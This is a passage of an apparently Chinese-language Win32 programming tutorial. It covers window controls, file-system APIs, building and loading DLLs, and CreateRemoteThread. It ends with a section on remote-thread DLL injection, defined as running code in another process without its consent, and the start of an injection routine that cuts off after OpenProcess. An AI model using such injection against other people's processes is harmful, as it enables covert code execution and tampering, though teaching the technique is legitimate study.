class="comment">//附加数据，先不管，填空</span></span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">if</span> (hwnd == <span class="literal">NULL</span>)                        <span class="comment">//创建失败就返回</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">sprintf</span>(szOutBuff, <span class="string">&quot;Error: %d\n&quot;</span>, GetLastError());</span><br><span class="line">        OutputDebugString(szOutBuff);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-10</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ShowWindow(hwnd, SW_SHOW);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3.第三步：接收消息并处理</span></span><br><span class="line">    MSG msg;</span><br><span class="line">    BOOL bRet;</span><br><span class="line">    <span class="keyword">while</span> ((bRet = GetMessage(&amp;msg, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">0</span>)) != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (bRet == <span class="number">-1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">sprintf</span>(szOutBuff, <span class="string">&quot;Error: %d\n&quot;</span>, GetLastError());</span><br><span class="line">            OutputDebugString(szOutBuff);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 转换消息</span></span><br><span class="line">            TranslateMessage(&amp;msg);</span><br><span class="line">            <span class="comment">// 分发消息 为了调用消息处理函数将这个消息处理掉</span></span><br><span class="line">            DispatchMessage(&amp;msg);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//消息处理函数</span></span><br><span class="line">LRESULT CALLBACK <span class="title function_">WindowProc</span><span class="params">(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> szOutBuff[<span class="number">0x80</span>];</span><br><span class="line">    <span class="comment">/*sprintf(szOutBuff, &quot;消息类型: %d\n&quot;, GetLastError());</span></span><br><span class="line"><span class="comment">    OutputDebugString(szOutBuff);*/</span></span><br><span class="line">    <span class="keyword">switch</span> (uMsg)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> WM_DESTROY:</span><br><span class="line">    &#123;</span><br><span class="line">        PostQuitMessage(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">case</span> WM_CREATE:</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//当创建了父窗口开始画子窗口</span></span><br><span class="line">        CreateWindow(</span><br><span class="line">            TEXT(<span class="string">&quot;EDIT&quot;</span>),                        <span class="comment">// Windows就知道这是一个文本框</span></span><br><span class="line">            <span class="string">&quot;&quot;</span>,                            <span class="comment">//    文本框不需要标题，所以给空</span></span><br><span class="line">            WS_CHILD | WS_VISIBLE | WS_VSCROLL | ES_MULTILINE,        <span class="comment">// 保证子窗口创建出来的时候在上层可见</span></span><br><span class="line">            <span class="number">10</span>,</span><br><span class="line">            <span class="number">10</span>,</span><br><span class="line">            <span class="number">200</span>,</span><br><span class="line">            <span class="number">100</span>,</span><br><span class="line">            hwnd,</span><br><span class="line">            (HMENU)IDC_EDIT_1,                        <span class="comment">//将宏定义的ID转换为HMENU类型</span></span><br><span class="line">            g_hInstance,</span><br><span class="line">            <span class="literal">NULL</span></span><br><span class="line">        );</span><br><span class="line">        CreateWindow(</span><br><span class="line">            TEXT(<span class="string">&quot;BUTTON&quot;</span>),                        <span class="comment">// 按钮</span></span><br><span class="line">            TEXT(<span class="string">&quot;设置&quot;</span>),</span><br><span class="line">            WS_CHILD | WS_VISIBLE,</span><br><span class="line">            <span class="number">300</span>,</span><br><span class="line">            <span class="number">300</span>,</span><br><span class="line">            <span class="number">100</span>,</span><br><span class="line">            <span class="number">30</span>,</span><br><span class="line">            hwnd,</span><br><span class="line">            (HMENU)IDC_BUTTON_1,                        <span class="comment">//将宏定义的ID转换为HMENU类型</span></span><br><span class="line">            g_hInstance,</span><br><span class="line">            <span class="literal">NULL</span></span><br><span class="line">        );</span><br><span class="line">        CreateWindow(</span><br><span class="line">            TEXT(<span class="string">&quot;BUTTON&quot;</span>),                        <span class="comment">// 按钮</span></span><br><span class="line">            TEXT(<span class="string">&quot;获取&quot;</span>),</span><br><span class="line">            WS_CHILD | WS_VISIBLE,</span><br><span class="line">            <span class="number">300</span>,</span><br><span class="line">            <span class="number">250</span>,</span><br><span class="line">            <span class="number">100</span>,</span><br><span class="line">            <span class="number">30</span>,</span><br><span class="line">            hwnd,</span><br><span class="line">            (HMENU)IDC_BUTTON_2,                        <span class="comment">//将宏定义的ID转换为HMENU类型</span></span><br><span class="line">            g_hInstance,</span><br><span class="line">            <span class="literal">NULL</span></span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">case</span> WM_COMMAND:</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span> (LOWORD(wParam))</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">case</span> IDC_BUTTON_1:</span><br><span class="line">        &#123;</span><br><span class="line">            SetDlgItemText(hwnd, IDC_EDIT_1, TEXT(<span class="string">&quot;123&quot;</span>));</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">case</span> IDC_BUTTON_2:</span><br><span class="line">        &#123;</span><br><span class="line">             GetDlgItemText(hwnd, IDC_EDIT_1,szOutBuff,<span class="number">100</span>);</span><br><span class="line">             MessageBox(hwnd, szOutBuff, szOutBuff, MB_OK);</span><br><span class="line">             <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> DefWindowProc(hwnd, uMsg, wParam, lParam);<span class="comment">//调用一下默认的消息处理函数</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>一个文本框、两个按钮。</p>
<h2 id="文件系统"><a href="#文件系统" class="headerlink" title="文件系统"></a>文件系统</h2><h3 id="卷相关API"><a href="#卷相关API" class="headerlink" title="卷相关API"></a>卷相关API</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;1&gt;获取卷</span><br><span class="line">GetLogicalDrives()</span><br><span class="line"></span><br><span class="line">&lt;2&gt;获取一个所卷的盘符的字符串</span><br><span class="line">GetLogicalDrives()</span><br><span class="line"></span><br><span class="line">&lt;3&gt;获取卷的类型</span><br><span class="line">GetLogicalDrives()</span><br><span class="line"></span><br><span class="line">&lt;4&gt;获取卷的类型</span><br><span class="line">GetVolumelnformation()</span><br></pre></td></tr></table></figure>

<h3 id="目录相关API"><a href="#目录相关API" class="headerlink" title="目录相关API"></a>目录相关API</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;1&gt;创建目录</span><br><span class="line">CreateDirectory();</span><br><span class="line"></span><br><span class="line">&lt;2&gt;删除目录</span><br><span class="line">RemoveDirectory</span><br><span class="line"></span><br><span class="line">&lt;3&gt;修改目录名称</span><br><span class="line">MoveFile();</span><br><span class="line"></span><br><span class="line">&lt;4&gt;获取程序当前目录</span><br><span class="line">GetCurrentDirectory();</span><br><span class="line"></span><br><span class="line">&lt;5&gt;设置程序当前目录</span><br><span class="line">SetCurrentDirectory</span><br></pre></td></tr></table></figure>

<h2 id="动态链接库"><a href="#动态链接库" class="headerlink" title="动态链接库"></a>动态链接库</h2><h3 id="动态链接库-1"><a href="#动态链接库-1" class="headerlink" title="动态链接库"></a>动态链接库</h3><p>动态链接库（Dynamic Link Library，缩写DLL），是微软咋Windows操作系统中，实现共享函数库的一种方式，这些库函数的扩展名是.dll或.ocx</p>
<h3 id="创建动态链接库"><a href="#创建动态链接库" class="headerlink" title="创建动态链接库"></a>创建动态链接库</h3><p>首先要告诉编译器，如果定义两个函数，这两个函数是要给别人用的</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> _declspec(dllexport) 调用约定 返回类型 函数名(参数列表)</span><br></pre></td></tr></table></figure>

<p>比如这两个函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">Plus</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> X + y;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">Sub</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> x - y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果是自己用这两个函数，那么声明函数的时候直接：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">Plus</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">Sub</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span>;</span><br></pre></td></tr></table></figure>

<p>如果是要创建DLL，那么声明的时候使用：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> _declspec(dllexport) __sdtcall <span class="type">int</span> <span class="title function_">Plus</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> _declspec(dllexport) __sdtcall <span class="type">int</span> <span class="title function_">Sub</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span>;</span><br></pre></td></tr></table></figure>

<p>声明时也可以使用.def文件：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">EXPORTS</span><br><span class="line">函数名 @编号</span><br><span class="line">函数名 @编号 NONAME</span><br></pre></td></tr></table></figure>

<p>使用序号导出的好处：名字是一段程序最精炼的注释，通过名字可能直接猜测到函数的功能，通过使用序号，可以达到隐藏的目的。</p>
<h3 id="使用DLL"><a href="#使用DLL" class="headerlink" title="使用DLL"></a>使用DLL</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//1.定义函数指针</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">int</span><span class="params">(_cdecl* lpPlus)</span><span class="params">(<span class="type">int</span>, <span class="type">int</span>)</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">int</span><span class="params">(_cdecl* lpSub)</span><span class="params">(<span class="type">int</span>, <span class="type">int</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//2.声明函数指针变量</span></span><br><span class="line">lpPlus myPlus;</span><br><span class="line">lpSub mySub;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//3.动态加载dll到内存中</span></span><br><span class="line">	HINSTANCE hModule = LoadLibrary(<span class="string">&quot;C:\\Users\\23394\\Desktop\\code\\C C++\\Dll1\\Debug\\Dll1.dll&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//4.获取函数地址</span></span><br><span class="line">	myPlus = (lpPlus)GetProcAddress(hModule, <span class="string">&quot;plus&quot;</span>);</span><br><span class="line">	mySub = (lpSub)GetProcAddress(hModule, <span class="string">&quot;sub&quot;</span>);</span><br><span class="line"><span class="comment">//5.调用函数</span></span><br><span class="line">	<span class="type">int</span> x = myPlus(<span class="number">1</span>, <span class="number">2</span>);</span><br><span class="line">	<span class="type">int</span> y = mySub(<span class="number">5</span>, <span class="number">2</span>);</span><br><span class="line"><span class="comment">//6.释放动态链接库</span></span><br><span class="line">	FreeLibrary(hModule);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>示例代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// MyDLL.cpp</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pch.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">plus</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> x + y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">sub</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> x - y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">BOOL APIENTRY <span class="title function_">DllMain</span><span class="params">( HMODULE hModule,</span></span><br><span class="line"><span class="params">                       DWORD  ul_reason_for_call,</span></span><br><span class="line"><span class="params">                       LPVOID lpReserved</span></span><br><span class="line"><span class="params">                     )</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;DLL_PROCESS_ATTACH\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;DLL_THREAD_ATTACH\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;DLL_THREAD_DETACH\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;DLL_PROCESS_DETACH\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>pch.h中添加：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> _declspec(dllexport) <span class="type">int</span> <span class="title function_">plus</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> _declspec(dllexport) <span class="type">int</span> <span class="title function_">sub</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span>;</span><br></pre></td></tr></table></figure>

<p>编译完成后生成一个DLL</p>
<p>创建一个新项目，使用这个DLL</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">int</span><span class="params">(_cdecl* lpPlus)</span><span class="params">(<span class="type">int</span>, <span class="type">int</span>)</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">int</span><span class="params">(_cdecl* lpSub)</span><span class="params">(<span class="type">int</span>, <span class="type">int</span>)</span>;</span><br><span class="line"></span><br><span class="line">lpPlus myPlus;</span><br><span class="line">lpSub mySub;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	HINSTANCE hModule = LoadLibrary(<span class="string">&quot;C:\\Users\\23394\\Desktop\\code\\C C++\\Dll1\\Debug\\Dll1.dll&quot;</span>);		<span class="comment">// 这里填DLL的路径（绝对路径或相对路径）</span></span><br><span class="line"></span><br><span class="line">	myPlus = (lpPlus)GetProcAddress(hModule, <span class="string">&quot;plus&quot;</span>);</span><br><span class="line">	mySub = (lpSub)GetProcAddress(hModule, <span class="string">&quot;sub&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> x = myPlus(<span class="number">1</span>, <span class="number">2</span>);</span><br><span class="line">	<span class="type">int</span> y = mySub(<span class="number">5</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">	FreeLibrary(hModule);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="隐式链接"><a href="#隐式链接" class="headerlink" title="隐式链接"></a>隐式链接</h3><h4 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h4><p>步骤1：将<code>.dll</code> <code>.lib</code>文件放到工程目录下面</p>
<p>步骤2：将&#96;#pragma comment(lib,”DLL名.lib”)添加到调用文件中</p>
<p>步骤3：加入函数的声明</p>
<h4 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib,<span class="string">&quot;C:\\Users\\23394\\Desktop\\code\\C C++\\win32AP\\Dll1.lib&quot;</span>)<span class="comment">//填写lib文件的路径</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//声明函数，这个声明跟在dll中的pch头文件中的声明一样</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="type">int</span> __declspec(dllimport) plus(<span class="type">int</span> x, <span class="type">int</span> y);</span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="type">int</span> __declspec(dllimport) sub(<span class="type">int</span> x, <span class="type">int</span> y);</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">//直接使用函数即可</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;plus(1, 2):%d, sub(3, 1):%d&quot;</span>, plus(<span class="number">1</span>, <span class="number">2</span>), sub(<span class="number">3</span>, <span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="DLL入口函数"><a href="#DLL入口函数" class="headerlink" title="DLL入口函数"></a>DLL入口函数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">BOOL APIENTRY <span class="title function_">DLLMain</span><span class="params">(HANDLE hModule, 	<span class="comment">//dll被加载到了哪个进程中，返回一个句柄</span></span></span><br><span class="line"><span class="params">						DWORD ul_reason_for_call, <span class="comment">//dll被调用的原因</span></span></span><br><span class="line"><span class="params">						LPVOID lpReserved)</span></span><br></pre></td></tr></table></figure>

<p>参数：DWORD ul_reason_for_call</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>当LoadLibrary时，DLL_PROCESS_ATTACH	(LoadLibrary)</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span>当FreeLibrary时，DLL_PROCESS_DETACH	(FreeLibrary)</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span>当在线程中加载dll时，DLL_THREAD_ATTACH</span><br><span class="line"></span><br><span class="line"><span class="number">4.</span>当加载这个dll的线程结束的时候也会再次加载这个dll，此时传递的参数就是DLL_THREAD_DETACH</span><br></pre></td></tr></table></figure>

<h2 id="远程线程"><a href="#远程线程" class="headerlink" title="远程线程"></a>远程线程</h2><h3 id="CreateRemoteThread"><a href="#CreateRemoteThread" class="headerlink" title="CreateRemoteThread"></a>CreateRemoteThread</h3><p>创建远程线程，就是在另一个进程中创建一个新的线程。比如我的进程是Demo.exe，那么可以在一个IE.exe中创建一个新的线程让他跑起来。</p>
<h3 id="远程线程函数"><a href="#远程线程函数" class="headerlink" title="远程线程函数"></a>远程线程函数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">HANDLE <span class="title function_">CreateRemoteThread</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in]  HANDLE                 hProcess,		<span class="comment">//在哪个进程中创建这个线程，需要传递一个进程句柄</span></span></span><br><span class="line"><span class="params">  [in]  LPSECURITY_ATTRIBUTES  lpThreadAttributes,</span></span><br><span class="line"><span class="params">  [in]  SIZE_T                 dwStackSize,</span></span><br><span class="line"><span class="params">  [in]  LPTHREAD_START_ROUTINE lpStartAddress,</span></span><br><span class="line"><span class="params">  [in]  LPVOID                 lpParameter,</span></span><br><span class="line"><span class="params">  [in]  DWORD                  dwCreationFlags,</span></span><br><span class="line"><span class="params">  [out] LPDWORD                lpThreadId</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>

<p>这个函数与创建线程的函数基本相同，只是多了第一个参数，也就是要在哪个进程中创建这个线程。</p>
<h3 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h3><p>首先创建一个程序，里面创建一个线程</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">DWORD WINAPI <span class="title function_">ThreadProc</span><span class="params">(LPVOID lpParameter)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		Sleep(<span class="number">1000</span>);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;-----%d-----\n&quot;</span>, i);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	HANDLE hThread;</span><br><span class="line">	hThread = CreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, ThreadProc, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">	CloseHandle(hThread);</span><br><span class="line"></span><br><span class="line">	getchar();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个线程在getchar处阻塞。</p>
<p>再写远程线程的程序：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">BOOL <span class="title function_">MyCreateRemoteThread</span><span class="params">(DWORD dwProcessId, DWORD dwProcessAddr)</span> &#123;</span><br><span class="line">	DWORD dwThreadId;</span><br><span class="line">	HANDLE hProcess;</span><br><span class="line">	HANDLE hThread;</span><br><span class="line">	<span class="comment">// 1. 获取进程句柄</span></span><br><span class="line">	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);</span><br><span class="line">	<span class="comment">// 判断OpenProcess是否执行成功</span></span><br><span class="line">	<span class="keyword">if</span> (hProcess == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		OutputDebugString(<span class="string">&quot;OpenProcess failed! \n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 2. 创建远程线程</span></span><br><span class="line">	hThread = CreateRemoteThread(</span><br><span class="line">		hProcess,							<span class="comment">// handle to process</span></span><br><span class="line">		<span class="literal">NULL</span>,								<span class="comment">// SD</span></span><br><span class="line">		<span class="number">0</span>,									<span class="comment">// initial stack size</span></span><br><span class="line">		(LPTHREAD_START_ROUTINE)dwProcessAddr,    <span class="comment">// thread function</span></span><br><span class="line">		<span class="literal">NULL</span>,								<span class="comment">// thread argument</span></span><br><span class="line">		<span class="number">0</span>,									<span class="comment">// creation option</span></span><br><span class="line">		&amp;dwThreadId							<span class="comment">// thread identifier</span></span><br><span class="line">	);</span><br><span class="line">	<span class="comment">// 判断CreateRemoteThread是否执行成功</span></span><br><span class="line">	<span class="keyword">if</span> (hThread == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		OutputDebugString(<span class="string">&quot;CreateRemoteThread failed! \n&quot;</span>);</span><br><span class="line">		CloseHandle(hProcess);</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 3. 关闭</span></span><br><span class="line">	CloseHandle(hThread);</span><br><span class="line">	CloseHandle(hProcess);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 返回</span></span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	MyCreateRemoteThread(<span class="number">39772</span>, <span class="number">0x6117B0</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>MyCreateRemoteThread函数中的第一个参数，传入的是要创建远程线程的程序的PID，也就是上面那个程序的PID；第二个参数是第一个程序中创建的线程的地址。</p>
<h2 id="远程线程注入"><a href="#远程线程注入" class="headerlink" title="远程线程注入"></a>远程线程注入</h2><h3 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h3><p>什么是注入<br>所谓注入就是在第三方进程不知道或者不允许的情况下将模块或者代码写入对方进程空间，并设法执行的技术。</p>
<p>在安全领域，“注入”是非常重要的一种技术手段，注入与反注入也一直处于不断变化的，而且也愈来愈激烈的对抗当中。</p>
<p>已知的注入方式：</p>
<p>远程线程注入、APC注入、消息钩子注入、注册表注入、导入表注入、输入法注入等等。</p>
<p>事例：</p>
<p>远程线程注入程序.exe：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Test.cpp : Defines the entry point for the console application.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;tlhelp32.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>(disable:4996)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>(disable:6031)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// LoadDll需要两个参数一个参数是进程ID，一个是DLL文件的路径</span></span><br><span class="line">BOOL <span class="title function_">LoadDll</span><span class="params">(DWORD dwProcessID, <span class="type">const</span> <span class="type">char</span>* szDllPathName)</span> &#123;</span><br><span class="line"></span><br><span class="line">	BOOL bRet;</span><br><span class="line">	HANDLE hProcess;</span><br><span class="line">	HANDLE hThread;</span><br><span class="line">	DWORD dwLength;</span><br><span class="line">	DWORD dwLoadAddr;</span><br><span class="line">	LPVOID lpAllocAddr;</span><br><span class="line">	DWORD dwThreadID;</span><br><span class="line">	HMODULE hModule;</span><br><span class="line"></span><br><span class="line">	bRet = <span class="number">0</span>;</span><br><span class="line">	dwLoadAddr = <span class="number">0</span>;</span><br><span class="line">	hProcess = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 1. 获取进程句柄  被注入的进程的句柄</span></span><br><span class="line">	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessID);</span><br><span class="line">	<span class="keyword">if</span> (hProcess == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		OutputDebugString(<span class="string">&quot;OpenProcess failed! \n&quot;</span>);</span><br><span class="line">		